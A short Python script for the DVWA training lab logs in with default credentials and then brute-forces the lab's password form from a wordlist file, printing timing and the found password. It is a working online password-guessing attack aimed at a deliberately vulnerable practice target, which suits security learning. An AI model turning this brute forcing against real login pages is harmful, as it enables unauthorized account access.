#!../venvkali/bin/python3
# !--*--coding:utf-8--*--
__author__ = 'Cazin Christophe'

''' 
Role :  Only for DVWA app. Go the the form and submit value and do a brute forcing to find the password in GET method

'''
import mechanicalsoup  # Library who include Requests and BeautifulSoup Lib and Mechanize old one
from termcolor import cprint  # Print with color options
import time

urldvwa='http://172.16.13.20/dvwa/login.php'
txtbfcheck='Welcome to the password protected area'
time_consumed = {} # dictionary to store time field

# Function part 
print_ok = lambda x: cprint(x, 'green', attrs=['blink'] )
print_ko = lambda x: cprint(x, 'red' )

print("## Starting Brute force DVWA {}".format(urldvwa))
# Create a browser object 
browser = mechanicalsoup.StatefulBrowser()
response = browser.open(urldvwa)


# Fill-in the form to log into the framework DVWA
browser.select_form('form[action="login.php"]') # Select the right form 
browser['username'] = "admin"
browser['password'] = "password"
response = browser.submit_selected()  # Validate and send form

# We have passed the first authentication. Now we are going on the goal -> Brute force section
lnkbf='vulnerabilities/brute/'
browser.follow_link(lnkbf)

passwords = open('password.txt', 'r')
#passwords = [ '123', '456', 'abc', 'def', 'pass', 'password', 'password123']
for password in passwords:
	time_consumed['start_time'] = time.time()
	browser.select_form('form[action="#"]') # Select the right form 
	browser['username'] = 'admin'
	browser['password'] = password.replace('\n','')
	response = browser.submit_selected()
	time_consumed['end_time'] = time.time()
	if txtbfcheck in response.text:
		print_ok("{1:5.2f} Password found : {0}".format(password.replace('\n',''),time_consumed['end_time'] - time_consumed['start_time']))
		break
	else:
		print_ko('{1:5.2f}s Password not found : {0}'.format(password.replace('\n',''),time_consumed['end_time'] - time_consumed['start_time']))
		browser.follow_link(lnkbf)


